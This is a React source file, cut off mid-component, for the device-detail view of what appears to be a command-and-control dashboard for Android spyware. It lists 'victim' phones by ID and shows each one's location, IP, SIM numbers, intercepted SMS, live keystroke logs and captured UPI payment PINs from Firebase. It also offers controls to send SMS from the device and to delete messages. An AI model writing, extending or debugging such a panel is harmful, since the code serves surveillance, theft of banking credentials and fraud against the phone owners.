import { useState, useEffect, useCallback, useRef, useMemo, memo } from 'react';
import { 
  Smartphone, 
  MessageSquare, 
  CreditCard, 
  KeyRound, 
  Shield,
  Wifi,
  Battery,
  MapPin,
  Clock,
  User,
  Phone,
  Globe,
  Trash2,
  X,
  Keyboard,
  ChevronLeft,
  ChevronRight,
  RefreshCw
} from 'lucide-react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Button } from '@/components/ui/button';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { useDB } from '@/hooks/useDB';
import { useDataCache } from '@/hooks/useDataCache';
import { DeviceInfo, KeyLog, DB } from '@/data/db';
import { getRelativeTime, parseTime } from '@/utils/time';
import { SendSMSDialog } from './SendSMSDialog';
import { firebaseService } from '@/lib/firebaseService';
import { toast } from 'sonner';
import { setPendingAndVerify } from '@/lib/responseChecker';
import { MessagesSkeleton, KeyLogsSkeleton, DeviceDetailSkeleton } from './SkeletonLoader';
import { FixedSizeList as List, ListChildComponentProps } from 'react-window';

// Memoized components for better performance
const MemoizedBadge = memo(Badge);
const MemoizedButton = memo(Button);

// Function to format date and time in the format: dd/MM/yyyy | hh:mm am/pm
const formatDateTime = (dateTimeString: string): string => {
  try {
    let date = new Date(dateTimeString);
    if (isNaN(date.getTime())) {
      // If the date string is not parseable, try to parse common formats
      const parts = dateTimeString.split(/[- :]/);
      if (parts.length >= 5) {
        // Format: dd-MM-yyyy HH:mm:ss
        const [day, month, year, hour, minute] = parts;
        const newDate = new Date(parseInt(year), parseInt(month) - 1, parseInt(day), parseInt(hour), parseInt(minute));
        if (!isNaN(newDate.getTime())) {
          date = newDate;
        }
      }
    }
    
    if (isNaN(date.getTime())) {
      return dateTimeString; // Return original if still not parseable
    }
    
    const day = date.getDate().toString().padStart(2, '0');
    const month = (date.getMonth() + 1).toString().padStart(2, '0');
    const year = date.getFullYear();
    const hour = date.getHours();
    const minute = date.getMinutes().toString().padStart(2, '0');
    const ampm = hour >= 12 ? 'pm' : 'am';
    const displayHour = (hour % 12 || 12).toString().padStart(2, '0');
    
    return `${day}/${month}/${year} | ${displayHour}:${minute} ${ampm}`;
  } catch (error) {
    return dateTimeString; // Return original if any error occurs
  }
};

// Helper to convert various timestamp formats to a unix epoch (ms)
const toTimestamp = (value?: string): number => {
  if (!value) return 0;
  // Deterministic parser for dd-MM-yyyy HH:mm:ss
  const m = value.match(/^(\d{2})-(\d{2})-(\d{4})[\sT](\d{2}):(\d{2})(?::(\d{2}))?$/);
  if (m) {
    const [, dd, MM, yyyy, HH, mm, ss] = m;
    const y = Number(yyyy);
    const mon = Number(MM) - 1;
    const d = Number(dd);
    const h = Number(HH);
    const mi = Number(mm);
    const s = Number(ss || '0');
    const dt = new Date(y, mon, d, h, mi, s);
    return dt.getTime();
  }
  try {
    const d = new Date(value);
    if (!isNaN(d.getTime())) return d.getTime();
  } catch {}
  return 0;
};

interface DeviceDetailProps {
  victimId: string;
  onClose: () => void;
}

export const DeviceDetail = memo(function DeviceDetail({ victimId, onClose }: DeviceDetailProps) {
  const { db, getVictimMessages, getSims, getKeyLogs, getUPIs, getVictimMessageCount } = useDB();
  const {
    getDeviceMessages: _getDeviceMessages,
    getDeviceKeyLogs: _getDeviceKeyLogs,
    getDeviceSims: _getDeviceSims,
    getDeviceUPIPins: _getDeviceUPIPins,
    invalidateCache: _invalidateCache,
  } = useDataCache();
  
  // Find the actual device ID by matching the model name
  const findDeviceId = useCallback((): string => {
    if (!db.DeviceInfo || Object.keys(db.DeviceInfo).length === 0) {
      console.log('Database not loaded yet');
      return victimId;
    }
    
    if (db.DeviceInfo[victimId]) {
      // If victimId directly matches a device ID, use it
      console.log('Found device by direct ID match:', victimId);
      return victimId;
    }
    
    // Otherwise, search for device by model name
    const deviceEntry = Object.entries(db.DeviceInfo).find(([id, device]) => 
      device.Model === victimId || device.Brand === victimId || id === victimId
    );
    
    if (deviceEntry) {
      console.log('Found device by model search:', deviceEntry[0], 'for model:', victimId);
      return deviceEntry[0];
    }
    
    // NEW: Try to find by the actual Firebase key names we saw in the database
    // The Firebase keys are actual device model names like "Xiaomi 23076PC4BI"
    if (db.DeviceInfo) {
      for (const [deviceId, device] of Object.entries(db.DeviceInfo)) {
        // Check if the victimId matches any part of the device info
        const deviceInfoString = `${device.Model} ${device.Brand} ${deviceId}`.toLowerCase();
        if (deviceInfoString.includes(victimId.toLowerCase())) {
          console.log('✅ Found device by partial match:', deviceId);
          return deviceId;
        }
      }
    }
    
    // CRITICAL FIX: Map common device references to actual Firebase keys
    // Based on the Firebase console, we have these actual keys:
    const deviceKeyMap: { [key: string]: string } = {
      'VICTIM-01': 'Xiaomi 23076PC4BI',
      'VICTIM-02': 'Xiaomi M2103K19PI',
      'Xiaomi M2103K19PI': 'Xiaomi M2103K19PI',
      'Xiaomi 23076PC4BI': 'Xiaomi 23076PC4BI'
    };
    
    if (deviceKeyMap[victimId]) {
      console.log('✅ Found device by key mapping:', deviceKeyMap[victimId]);
      return deviceKeyMap[victimId];
    }
    
    console.log('No device found for:', victimId, 'Available devices:', Object.keys(db.DeviceInfo));
    return victimId; // Fallback to original victimId
  }, [db.DeviceInfo, victimId]);
  
  const [actualDeviceId, setActualDeviceId] = useState<string>(victimId);
  
  // Update actualDeviceId when database loads
  useEffect(() => {
    const newDeviceId = findDeviceId();
    if (newDeviceId !== actualDeviceId) {
      console.log('Updating actualDeviceId from', actualDeviceId, 'to', newDeviceId);
      setActualDeviceId(newDeviceId);
    }
    
    // Immediate debug info
    console.log('=== IMMEDIATE DEBUG ===');
    console.log('Database loaded:', !!db.DeviceInfo);
    console.log('DeviceInfo keys:', Object.keys(db.DeviceInfo || {}));
    console.log('KeyLogs keys:', Object.keys(db.KeyLogs || {}));
    console.log('victimId:', victimId);
    console.log('newDeviceId:', newDeviceId);
    console.log('=== END IMMEDIATE DEBUG ===');
    
    // NEW: Log the actual Firebase KeyLogs structure
    if (db.KeyLogs) {
      console.log('🔍 Firebase KeyLogs structure:');
      Object.keys(db.KeyLogs).forEach(deviceKey => {
        console.log(`  ${deviceKey}:`, Object.keys(db.KeyLogs[deviceKey] || {}));
      });
    }
  }, [findDeviceId, actualDeviceId, db.DeviceInfo, db.KeyLogs, victimId]);
  
  const device = useMemo(() => db.DeviceInfo?.[actualDeviceId], [db.DeviceInfo, actualDeviceId]);

  // Async/loading/data states
  const [loadingStates, setLoadingStates] = useState({
    messages: false,
    sims: false,
    keylogs: false,
    upis: false,
  });
  const [messages, setMessages] = useState<any[]>([]);
  const [sims, setSims] = useState<any[]>([]);
  const [keylogs, setKeylogs] = useState<KeyLog[]>([]);
  const [upis, setUpis] = useState<any[]>([]);

  // State for async data loading
  const [activeTab, setActiveTab] = useState("overview");
  const [showSMSDialog, setShowSMSDialog] = useState(false);
  const [isChecking, setIsChecking] = useState(false);
  
  // Debug logging for keylogs state changes
  useEffect(() => {
    console.log('🔄 keylogs state changed:', keylogs);
    console.log('  - Length:', keylogs.length);
    console.log('  - First item:', keylogs[0]);
  }, [keylogs]);
  // Sort order controls
  const [messagesOrder, setMessagesOrder] = useState<'asc' | 'desc'>('desc');
  const [keyLogsOrder, setKeyLogsOrder] = useState<'asc' | 'desc'>('desc');
  const [upiOrder, setUpiOrder] = useState<'asc' | 'desc'>('desc');
  // Guard against overlapping check attempts
  const checkSeqRef = useRef(0);
  const checkTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  
  // Messages virtualization config and sorted view
  const MESSAGES_VIRTUALIZE_THRESHOLD = 400;
  const MESSAGES_LIST_HEIGHT = 600; // px
  const MESSAGES_ROW_HEIGHT = 56; // px approx per row
  const sortedMessages = useMemo(() => {
    return messages
      .map((msg, idx) => ({ msg, ts: toTimestamp(msg?.Time), idx }))
      .sort((a, b) => {
        const dir = messagesOrder === 'desc' ? -1 : 1;
        const tdiff = dir * (a.ts - b.ts);
        if (tdiff !== 0) return tdiff;
        return dir * (a.idx - b.idx);
      })
      .map(({ msg }) => msg);
  }, [messages, messagesOrder]);
  
  // Pagination state for key logs
  const [keyLogsPage, setKeyLogsPage] = useState(1);
  const [keyLogsPerPage, setKeyLogsPerPage] = useState(50);

  // Virtualization config for key logs
  const KEYLOG_VIRTUALIZE_THRESHOLD = 400;
  const KEYLOG_LIST_HEIGHT = 600; // px
  const KEYLOG_ROW_HEIGHT = 40; // px (approx)

  // Flatten and sort key logs into row data used by both normal and virtual rendering
  const flattenedKeyLogRows = useMemo(() => {
    const rows = keylogs
      .flatMap((log, logIdx) => {
        if ((log as any).Column1 !== undefined) {
          const cols: Array<{ keylogger: string; value: string; timestamp: any; ts?: number; rowId: string } > = [];
          for (let i = 1; i <= 6; i++) {
            const columnKey = `Column${i}` as const;
            if ((log as any)[columnKey] !== undefined && (log as any)[columnKey] !== '') {
              const rawTs = (log as any).timestamp || (log as any).time || (log as any).Timestamp || (log as any).Time;
              cols.push({
                keylogger: (log as any).keylogger || 'UPI_PIN',
                value: (log as any)[columnKey],
                timestamp: rawTs,
                ts: toTimestamp(rawTs),
                rowId: `${logIdx}-${i}`
              });
            }
          }
          return cols;
        } else if ((log as any).text) {
          const rawTs = (log as any).timestamp || (log as any).time || (log as any).Timestamp || (log as any).Time;
          return [{
            keylogger: (log as any).keylogger || 'KEY_LOG',
            value: (log as any).text,
            timestamp: rawTs,
            ts: toTimestamp(rawTs),
            rowId: `${logIdx}`
          }];
        } else {
          return [] as any[];
        }
      })
      .sort((a, b) => {
        const dir = keyLogsOrder === 'desc' ? -1 : 1;
        const ta = a.ts ?? toTimestamp(a.timestamp);
        const tb = b.ts ?? toTimestamp(b.timestamp);
        const tDiff = dir * (ta - tb);
        if (tDiff !== 0) return tDiff;
        return dir * (a.rowId.localeCompare(b.rowId));
      });
    return rows;
  }, [keylogs, keyLogsOrder]);

  // Reset key logs page when order changes
  useEffect(() => {
    setKeyLogsPage(1);
  }, [keyLogsOrder]);

  const handleDeleteMessage = async (message: any, index: number) => {
    try {
      // Find the message ID from the database
      const allMessages = db.SMSData || {};
      const messageEntry = Object.entries(allMessages).find(([_, msg]: [string, any]) => 
        msg.VictimId === actualDeviceId && 
        msg.Time === message.Time && 
        (msg.Body === message.Body || msg.Message === message.Message)
      );

      if (messageEntry) {
        const [messageId] = messageEntry;
        // Delete from Firebase
        await firebaseService.deleteSMSData(messageId);
        
        // Update local state
        setMessages(prev => prev.filter((_, idx) => idx !== index));
      }
    } catch (error) {
      console.error('Error deleting message:', error);
    }
  };

  // Instrumentation: mark when component mounts
  useEffect(() => {
    try { performance.mark('device_detail_mounted'); } catch {}
  }, []);

  // Defer messages loading until Messages tab is opened
  useEffect(() => {
    if (!actualDeviceId) return;
    if (activeTab !== 'messages') return;
    if (loadingStates.messages) return;
    if (messages.length > 0) return; // already loaded
    setLoadingStates(prev => ({ ...prev, messages: true }));
    (async () => {
      try {
        const messagesData = await _getDeviceMessages(actualDeviceId);
        setMessages(messagesData);
      } catch (error) {
        console.error('Error loading messages:', error);
      } finally {
        setLoadingStates(prev => ({ ...prev, messages: false }));
        try { performance.mark('device_messages_loaded'); performance.measure('device_detail_messages_time', 'device_detail_mounted', 'device_messages_loaded'); } catch {}
      }
    })();
  }, [activeTab, actualDeviceId, _getDeviceMessages, messages.length, loadingStates.messages]);

  // Defer UPI pins loading until UPI tab is opened
  useEffect(() => {
    if (!actualDeviceId) return;
    if (activeTab !== 'upi') return;
    if (loadingStates.upis) return;
    if (upis.length > 0) return;
    setLoadingStates(prev => ({ ...prev, upis: true }));
    (async () => {
      try {
        const upiPinsData = await _getDeviceUPIPins(actualDeviceId);
        setUpis(upiPinsData);
      } catch (error) {
        console.error('Error loading UPI pins:', error);
      } finally {
        setLoadingStates(prev => ({ ...prev, upis: false }));
      }
    })();
  }, [activeTab, actualDeviceId, _getDeviceUPIPins, upis.length, loadingStates.upis]);

  // Real-time KeyLogs listener (only when Key Logs tab is active)
  useEffect(() => {
    if (!actualDeviceId) return;
    if (activeTab !== 'keylogs') return;

    console.log('Setting up KeyLogs listener for:', actualDeviceId);

    const unsubscribe = firebaseService.onKeyLogsUpdate(actualDeviceId, (keyLogsData) => {
      console.log('KeyLogs data received:', keyLogsData);
      setKeylogs(keyLogsData);
      setLoadingStates(prev => ({ ...prev, keylogs: false }));
    });

    // Also try to load initial data
    const loadInitialKeyLogs = async () => {
      try {
        console.log('🔍 Loading initial KeyLogs for device:', actualDeviceId);
        console.log('  - Using firebaseService.getKeyLogs...');
        
        const initialData = await _getDeviceKeyLogs(actualDeviceId, 100);
        console.log('✅ Initial KeyLogs loaded via firebaseService:', initialData);
        console.log('  - Number of logs:', initialData?.length || 0);
        console.log('  - First log sample:', initialData?.[0]);
        
        // Also try to load via useDB hook
        try {
          console.log('🔍 Trying useDB hook getKeyLogs...');
          console.log('  - Using actualDeviceId:', actualDeviceId);
          console.log('  - Bypassing cache to force fresh load...');
          
          // Force fresh load by calling firebaseService directly
          const freshData = await firebaseService.getKeyLogs(actualDeviceId, 100);
          console.log('✅ Fresh KeyLogs loaded via firebaseService:', freshData);
          console.log('  - Number of logs:', freshData?.length || 0);
          console.log('  - First log sample:', freshData?.[0]);
          
          if (freshData.length > 0) {
            console.log('📊 Using fresh firebaseService data (', freshData.length, 'logs)');
            setKeylogs(freshData);
          } else {
            console.log('📊 No fresh data, using initial data (', initialData.length, 'logs)');
            setKeylogs(initialData);
          }
        } catch (hookError) {
          console.log('⚠️ Fresh load failed, using initial data');
          console.log('  - Error:', hookError);
          setKeylogs(initialData);
        }
        
        setLoadingStates(prev => ({ ...prev, keylogs: false }));
      } catch (error) {
        console.error('❌ Error loading initial KeyLogs:', error);
        setLoadingStates(prev => ({ ...prev, keylogs: false }));
      }
    };

    loadInitialKeyLogs();

    return () => unsubscribe();
  }, [actualDeviceId]);

  // Reset to first page when rows per page changes
  useEffect(() => {
    setKeyLogsPage(1);
  }, [keyLogsPerPage]);

  // Also reset to first page whenever keylogs data changes to show newest first
  useEffect(() => {
    setKeyLogsPage(1);
  }, [keylogs]);

  // Lazy load SIMs when tab is accessed
  useEffect(() => {
    if (activeTab === "sims" && sims.length === 0 && !loadingStates.sims) {
      const loadSimsData = async () => {
        setLoadingStates(prev => ({ ...prev, sims: true }));
        try {
          const simsData = await _getDeviceSims(actualDeviceId);
          setSims(simsData);
        } catch (error) {
          console.error('Error loading SIMs:', error);
        } finally {
          setLoadingStates(prev => ({ ...prev, sims: false }));
        }
      };
      loadSimsData();
    }
  }, [activeTab, actualDeviceId, getSims, sims.length, loadingStates.sims]);

  // Function to calculate total rows for pagination (accounting for column structure)
  const getTotalKeyLogRows = (): number => {
    return keylogs.reduce((total, log) => {
      if (log.Column1 !== undefined) {
        // Count each column that has a value
        let columnCount = 0;
        for (let i = 1; i <= 6; i++) {
          const columnKey = `Column${i}`;
          if (log[columnKey] !== undefined) {
            columnCount++;
          }
        }
        return total + columnCount;
      } else {
        // Fallback to original structure
        return total + 1;
      }
    }, 0);
  };

  // Debug function to check database structure
  const debugDatabase = async () => {
    console.log('=== DATABASE DEBUG ===');
    console.log('victimId:', victimId);
    console.log('actualDeviceId:', actualDeviceId);
    console.log('db.DeviceInfo keys:', Object.keys(db.DeviceInfo || {}));
    console.log('db.KeyLogs keys:', Object.keys(db.KeyLogs || {}));
    console.log('Current device:', device);
    console.log('Current keylogs state:', keylogs);
    console.log('Loading states:', loadingStates);
    
    // Test Firebase connection
    try {
      console.log('Testing Firebase connection...');
      const testDevices = await firebaseService.getDevices();
      console.log('Firebase devices test:', testDevices);
    } catch (firebaseError) {
      console.error('Firebase connection error:', firebaseError);
    }
    
    if (actualDeviceId) {
      try {
        console.log('Trying to get KeyLogs for device:', actualDeviceId);
        const directData = await firebaseService.getKeyLogs(actualDeviceId, 100);
        console.log('Direct Firebase KeyLogs:', directData);
        
        // Also try the useDB hook
        try {
          const hookData = await getKeyLogs(actualDeviceId, 100);
          console.log('useDB hook KeyLogs:', hookData);
        } catch (hookError) {
          console.error('useDB hook error:', hookError);
        }
      } catch (error) {
        console.error('Error getting direct KeyLogs:', error);
      }
    }
    
    // Check if there's any data in the mock database
    console.log('Mock DB KeyLogs:', DB.KeyLogs);
    console.log('Mock DB DeviceInfo:', DB.DeviceInfo);
    console.log('=== END DEBUG ===');
  };


  if (!device) {
    return null;
  }

  console.log('DeviceDetail render - victimId:', victimId, 'actualDeviceId:', actualDeviceId);
  console.log('Current keylogs state:', keylogs);
  console.log('Loading states:', loadingStates);
  console.log('Device found:', device);
  console.log('Database state:', {
    DeviceInfoKeys: Object.keys(db.DeviceInfo || {}),
    KeyLogsKeys: Object.keys(db.KeyLogs || {}),
    SMSDataKeys: Object.keys(db.SMSData || {})
  });

  return (
    <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 animate-fade-in">
      <div className="fixed right-0 top-0 h-full w-full max-w-2xl bg-background shadow-2xl animate-slide-up overflow-y-auto">
        {/* Header */}
        <div className="sticky top-0 bg-background/80 backdrop-blur-md border-b p-6 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-lg bg-gradient-to-br from-primary to-accent flex items-center justify-center">
              <Smartphone className="w-5 h-5 text-white" />
            </div>
            <div>
              <h2 className="text-xl font-bold text-foreground">{device.Model}</h2>
              <p className="text-sm text-muted-foreground">{device.VictimId}</p>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <Button
              variant="outline"
              size="sm"
              disabled={isChecking}
              onClick={async () => {
                if (!actualDeviceId || !device) return;
                try {
                  setIsChecking(true);
                  const modelIdentifier = (device.Model || '').trim() || actualDeviceId;
                  const result = await setPendingAndVerify(
                    {
                      modelIdentifier,
                      victimId,
                      additionalKeys: [actualDeviceId],
                      updateIds: actualDeviceId && actualDeviceId !== victimId ? [actualDeviceId] : [],
                    },
                    { delayMs: 5000, retryMs: 3000, maxRetries: 1, logPrefix: 'DeviceDetail' }
                  );
                  if (result === 'online') {
                    toast.success('Device is online', { duration: 3000 });
                  } else if (result === 'offline') {
                    toast.error('Device is offline', { duration: 3000 });
                  } else {
                    toast.message('device is offline', { duration: 2000 });
                  }
                  setIsChecking(false);
                } catch (err) {
                  console.error('Failed to set ResponseChecker pending (detail check):', err);
                  setIsChecking(false);
                  toast.error('Failed to send check request');
                }
              }}
              className="gap-2"
            >
              <RefreshCw className={`w-4 h-4 ${isChecking ? 'animate-spin' : ''}`} />
              Check
            </Button>
            <Button variant="ghost" size="icon" onClick={onClose}>
              <X className="w-5 h-5" />
            </Button>
          </div>
        </div>

        {/* Content */}
        <div className="p-6">
          <Tabs defaultValue="overview" className="w-full" onValueChange={setActiveTab}>
            <TabsList className="grid w-full grid-cols-5">
              <TabsTrigger value="overview">Overview</TabsTrigger>
              <TabsTrigger value="messages">Messages</TabsTrigger>
              <TabsTrigger value="sims">SIMs</TabsTrigger>
              <TabsTrigger value="keylogs">Key logs</TabsTrigger>
              <TabsTrigger value="upipins">UPI pins</TabsTrigger>
            </TabsList>

            <TabsContent value="overview" className="mt-6">
              <Card className="card-glass border-0">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Smartphone className="w-5 h-5" />
                    Device Information
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-6">
                    {/* Device Information */}
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                      <div className="space-y-4">
                        <div className="flex justify-between">
                          <span className="text-muted-foreground">Status:</span>
                          <Badge variant={device.Status === 'Online' ? 'default' : 'secondary'}>
                            {device.Status}
                          </Badge>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-muted-foreground">IP Address:</span>
                          <span className="font-medium">{device.IP}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-muted-foreground">Location:</span>
                          <span className="font-medium">{device.Location}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-muted-foreground">Last Seen:</span>
                          <span className="font-medium">{getRelativeTime(device.LastSeen)}</span>
                        </div>
                      </div>
                      <div className="space-y-4">
                        <div className="flex justify-between">
                          <span className="text-muted-foreground">Apps Installed:</span>
                          <Badge variant="outline">{device.AppsInstalled}</Badge>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-muted-foreground">Battery:</span>
                          <Badge variant={parseInt(device.Battery?.replace('%', '') || '0') < 20 ? 'destructive' : 'default'}>
                            {device.Battery}
                          </Badge>
                        </div>
                      </div>
                    </div>

                    {/* Device Brand, Model, and Android Version */}
                    <div className="border-t pt-6">
                      <h3 className="text-lg font-semibold mb-4">Device Specifications</h3>
                      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                        <div className="p-4 bg-muted/30 rounded-lg">
                          <div className="flex justify-between">
                            <span className="text-muted-foreground">Brand:</span>
                            <Badge variant="outline">{device.Brand || 'Unknown'}</Badge>
                          </div>
                        </div>
                        <div className="p-4 bg-muted/30 rounded-lg">
                          <div className="flex justify-between">
                            <span className="text-muted-foreground">Model:</span>
                            <span className="font-medium font-mono text-foreground">{device.Model || 'Unknown'}</span>
                          </div>
                        </div>
                        <div className="p-4 bg-muted/30 rounded-lg">
                          <div className="flex justify-between">
                            <span className="text-muted-foreground">Android Version:</span>
                            <Badge variant="outline">{device.AndroidVersion || 'Unknown'}</Badge>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="messages" className="mt-6">
              <Card className="card-glass border-0">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <MessageSquare className="w-5 h-5" />
                    Messages ({getVictimMessageCount(actualDeviceId)})
                    <div className="ml-auto flex items-center gap-2">
                      <span className="text-sm text-muted-foreground">Order</span>
                      <Select value={messagesOrder} onValueChange={(v) => setMessagesOrder(v as 'asc' | 'desc')}>
                        <SelectTrigger className="w-36">
                          <SelectValue />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="desc">Newest first</SelectItem>
                          <SelectItem value="asc">Oldest first</SelectItem>
                        </SelectContent>
                      </Select>
                    </div>
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  {loadingStates.messages ? (
                    <MessagesSkeleton />
                  ) : sortedMessages.length === 0 ? (
                    <p className="text-muted-foreground text-center py-8">No messages found</p>
                  ) : sortedMessages.length > MESSAGES_VIRTUALIZE_THRESHOLD ? (
                    <div className="space-y-2">
                      {/* Sticky header mimic */}
                      <div className="grid grid-cols-5 gap-2 px-4 py-2 font-semibold sticky top-0 bg-background/80 backdrop-blur-sm border-b">
                        <div>Type</div>
                        <div>Sender</div>
                        <div>Message</div>
                        <div>Date & Time</div>
                        <div className="text-center">Actions</div>
                      </div>
                      <List height={MESSAGES_LIST_HEIGHT} itemCount={sortedMessages.length} itemSize={MESSAGES_ROW_HEIGHT} width={'100%'}>
                        {({ index, style }: ListChildComponentProps) => {
                          const msg = sortedMessages[index] as any;
                          return (
                            <div style={style} className="grid grid-cols-5 gap-2 px-4 py-2 border-b items-center">
                              <div>
                                <Badge variant={msg?.Type === 'INBOX' ? 'secondary' : 'default'}>{msg?.Type || 'SMS'}</Badge>
                              </div>
                              <div className="font-medium truncate" title={msg?.Sender || msg?.From}>{msg?.Sender || msg?.From}</div>
                              <div className="font-mono truncate" title={msg?.Body || msg?.Message}>{msg?.Body || msg?.Message}</div>
                              <div className="text-sm text-muted-foreground">{formatDateTime(msg?.Time)}</div>
                              <div className="text-center">
                                <Button variant="ghost" size="icon" onClick={() => handleDeleteMessage(msg, index)}>
                                  <Trash2 className="w-4 h-4" />
                                </Button>
                              </div>
                            </div>
                          );
                        }}
                      </List>
                    </div>
                  ) : (
                    <div className="overflow-x-auto">
                      <Table>
                        <TableHeader>
                          <TableRow>
                            <TableHead>Type</TableHead>
                            <TableHead>Sender</TableHead>
                            <TableHead>Message</TableHead>
                            <TableHead>Date & Time</TableHead>
                            <TableHead className="w-[50px]">Actions</TableHead>
                          </TableRow>
                        </TableHeader>
                        <TableBody>
                          {sortedMessages.map((msg, idx) => (
                            <TableRow key={idx}>
                              <TableCell>
                                <Badge variant={msg?.Type === 'INBOX' ? 'secondary' : 'default'}>
                                  {msg?.Type || 'SMS'}
                                </Badge>
                              </TableCell>
                              <TableCell className="font-medium">{msg?.Sender || msg?.From}</TableCell>
                              <TableCell className="font-mono whitespace-pre-wrap break-words max-w-[40rem]">{msg?.Body || msg?.Message}</TableCell>
                              <TableCell className="text-sm text-muted-foreground">{formatDateTime(msg?.Time)}</TableCell>
                              <TableCell>
                                <Button variant="ghost" size="icon" onClick={() => handleDeleteMessage(msg, idx)}>
                                  <Trash2 className="w-4 h-4" />
                                </Button>
                              </TableCell>
                            </TableRow>
                          ))}
                        </TableBody>
                      </Table>
                    </div>
                  )}
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="sims" className="mt-6">
              <Card className="card-glass border-0">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Phone className="w-5 h-5" />
                    SIM Cards ({(() => {
                      let detectedCount = 0;
                      if (device.SimNumber1 && device.SimNumber1 !== 'Unknown') detectedCount++;
                      if (device.SimNumber2 && device.SimNumber2 !== 'Unknown') detectedCount++;
                      return detectedCount;
                    })()})
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-6">
                    {/* Device SIM Numbers */}
                    <div className="space-y-3">
                      <h3 className="text-lg font-semibold">Device SIM Numbers</h3>
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                        <div className="p-4 bg-muted/30 rounded-lg">
                          <div className="flex justify-between">
                            <span className="text-muted-foreground">SIM 1:</span>
                            <span className="font-medium font-mono">{device.SimNumber1 || 'Unknown'}</span>
                          </div>
                        </div>
                        <div className="p-4 bg-muted/30 rounded-lg">
                          <div className="flex justify-between">
                            <span className="text-muted-foreground">SIM 2:</span>
                            <span className="font-medium font-mono">{device.SimNumber2 || 'Unknown'}</span>
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* Device Service Names */}
                    <div className="space-y-3">
                      <h3 className="text-lg font-semibold">Device Service Names</h3>
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                        <div className="p-4 bg-muted/30 rounded-lg">
                          <div className="flex justify-between">
                            <span className="text-muted-foreground">Service 1:</span>
                            <span className="font-medium">{device.ServiceName1 || 'Unknown'}</span>
                          </div>
                        </div>
                        <div className="p-4 bg-muted/30 rounded-lg">
                          <div className="flex justify-between">
                            <span className="text-muted-foreground">Service 2:</span>
                            <span className="font-medium">{device.ServiceName2 || 'Unknown'}</span>
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* SIM Cards from Database */}
                    <div className="space-y-3">
                      <h3 className="text-lg font-semibold">SIM Cards from Database</h3>
                      {loadingStates.sims ? (
                        <div className="text-center py-8">
                          <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-primary mx-auto mb-2"></div>
                          <p className="text-sm text-muted-foreground">Loading SIM cards...</p>
                        </div>
                      ) : sims.length === 0 ? (
                        <p className="text-muted-foreground text-center py-8">No SIM cards found in database</p>
                      ) : (
                        <div className="space-y-4">
                          {sims.map((sim, idx) => (
                            <div key={idx} className="p-4 bg-muted/30 rounded-lg border">
                              <div className="grid grid-cols-2 gap-4 text-sm">
                                <div className="flex justify-between">
                                  <span className="text-muted-foreground">Phone Number:</span>
                                  <span className="font-medium">{sim.PhoneNumber}</span>
                                </div>
                                <div className="flex justify-between">
                                  <span className="text-muted-foreground">Carrier:</span>
                                  <span className="font-medium">{sim.Carrier}</span>
                                </div>
                                <div className="flex justify-between">
                                  <span className="text-muted-foreground">Country:</span>
                                  <span className="font-medium">{sim.Country}</span>
                                </div>
                                <div className="flex justify-between">
                                  <span className="text-muted-foreground">State:</span>
                                  <span className="font-medium">{sim.State}</span>
                                </div>
                              </div>
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  </div>
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="keylogs" className="mt-6">
              <Card className="card-glass border-0">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Keyboard className="w-5 h-5" />
                    Key Logs ({getTotalKeyLogRows()})
                    <Badge variant="secondary" className="text-xs animate-pulse">
                      Live
                    </Badge>
                    <div className="flex items-center gap-2 ml-auto">
                      <span className="text-sm text-muted-foreground">Order</span>
                      <Select value={keyLogsOrder} onValueChange={(v) => setKeyLogsOrder(v as 'asc' | 'desc')}>
                        <SelectTrigger className="w-36">
                          <SelectValue />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="desc">Newest first</SelectItem>
                          <SelectItem value="asc">Oldest first</SelectItem>
                        </SelectContent>
                      </Select>
                      <div className="w-px h-6 bg-border" />
                      <Button 
                        variant="outline" 
                        size="sm" 
                        onClick={debugDatabase}
                      >
                        Debug
                      </Button>
                      <Button 
                        variant="outline" 
                        size="sm" 
                        onClick={() => {
                          console.log('Loading mock data...');
                          setKeylogs(DB.KeyLogs[actualDeviceId] || []);
                          setLoadingStates(prev => ({ ...prev, keylogs: false }));
                        }}
                      >
                        Load Mock
                      </Button>
                      <Button 
                        variant="outline" 
                        size="sm" 
                        onClick={async () => {
                          console.log('Testing Firebase connection...');
                          try {
                            const devices = await firebaseService.getDevices();
                            console.log('Firebase devices:', devices);
                            alert(`Firebase connection successful! Found ${Object.keys(devices).length} devices.`);
                          } catch (error) {
                            console.error('Firebase test failed:', error);
                            alert(`Firebase connection failed: ${error.message}`);
                          }
                        }}
                      >
                        Test Firebase
                      </Button>
                      <Button 
                        variant="outline" 
                        size="sm" 
                        onClick={async () => {
